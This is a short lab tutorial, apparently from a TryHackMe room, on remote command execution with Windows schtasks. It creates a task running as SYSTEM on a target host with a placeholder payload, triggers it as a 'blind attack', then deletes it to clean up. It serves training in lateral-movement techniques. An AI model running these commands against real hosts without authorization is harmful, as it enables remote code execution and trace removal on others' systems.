Title: Creating and Executing Scheduled Tasks for Command Execution

To create a scheduled task named THMtask1 for command execution, follow these steps:

### 1. Create the Task:
   ```powershell
   schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "\<command/payload to execute\>" /sc ONCE /sd 01/01/1970 /st 00:00
   ```
   - Set the target (/s) to the desired host.
   - Specify the user account to run the task under (/RU). In this case, we use "SYSTEM" for elevated privileges.
   - Assign a name to the task (/tn).
   - Set the command or payload to be executed (/tr).
   - Configure the schedule type as ONCE (/sc) since the task will be run only once.
   - Specify a starting date (/sd) and time (/st), although they are not crucial for manual execution.

### 2. Execute the Task:
   ```powershell
   schtasks /s TARGET /run /TN "THMtask1"
   ```
   - This command triggers the execution of the scheduled task.

Note: Since the system runs the task, the output of the executed command will not be visible, making it a blind attack.

### 3. Delete the Scheduled Task:
   ```powershell
   schtasks /S TARGET /TN "THMtask1" /DELETE /F
   ```
   - This command deletes the scheduled task to clean up after the execution.

Remember to exercise caution and ensure proper authorization when using scheduled tasks for command execution.
